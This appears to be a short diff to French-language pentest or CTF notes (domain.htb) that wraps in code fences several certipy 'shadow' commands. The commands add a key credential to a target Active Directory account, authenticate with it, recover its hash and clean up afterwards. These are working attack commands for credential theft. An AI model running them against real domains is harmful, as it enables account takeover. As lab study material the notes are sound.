@@ -17,7 +17,7 @@ Tu as ManageCertificates sur la CA	certipy ca (ESC7)
 
 Les sous-commandes :
 
-bash
+```bash
 # Tout en une fois (ajoute la clé, auth, récupère hash, restore)
 certipy shadow auto -u 'USER@domaine.htb' -p 'PASS' -account CIBLE -dc-ip IP
 
@@ -29,7 +29,7 @@ certipy shadow list -u 'USER@domaine.htb' -p 'PASS' -account CIBLE -dc-ip IP
 
 # Supprimer une clé ajoutée (cleanup manuel)
 certipy shadow remove -u 'USER@domaine.htb' -p 'PASS' -account CIBLE -device-id ID -dc-ip IP
-
+```
 Toujours préférer auto — il restaure automatiquement les anciennes clés après avoir récupéré le hash, ce qui évite de casser l'authentification du compte cible.
 
 Résumé en une ligne :
